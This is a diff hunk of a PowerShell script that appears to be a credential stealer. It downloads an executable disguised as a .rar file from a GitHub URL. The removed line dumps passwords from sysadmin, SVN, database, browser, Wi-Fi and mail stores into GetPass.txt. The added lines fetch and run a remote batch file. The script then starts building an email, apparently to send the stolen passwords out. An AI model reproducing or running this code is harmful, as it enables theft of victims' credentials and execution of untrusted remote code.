@@ -2755,7 +2755,8 @@ $huifu1 = (Get-ChildItem env:\username).value + ' GetPass.txt'
 $huifu2 = (Get-ChildItem env:\username).value + ' Report.zip'
 
 (new-object System.Net.WebClient).DownloadFile('https://github.com/begiilm/dy/raw/master/Get.rar','D:\Get.exe');
-(D:\Get.exe sysadmin & D:\Get.exe svn & D:\Get.exe database & D:\Get.exe browsers & D:\Get.exe wifi & D:\Get.exe mails) > D:\GetPass.txt
+(new-object System.Net.WebClient).DownloadFile('https://github.com/begiilm/dy/raw/master/run.rar','D:\run.bat');
+D:\run.bat
 $mail = New-Object System.Net.Mail.MailMessage
 #set the addresses
 $mail.From = New-Object System.Net.Mail.MailAddress('2014652020@email.ctbu.edu.cn','2014652020@email.ctbu.edu.cn')
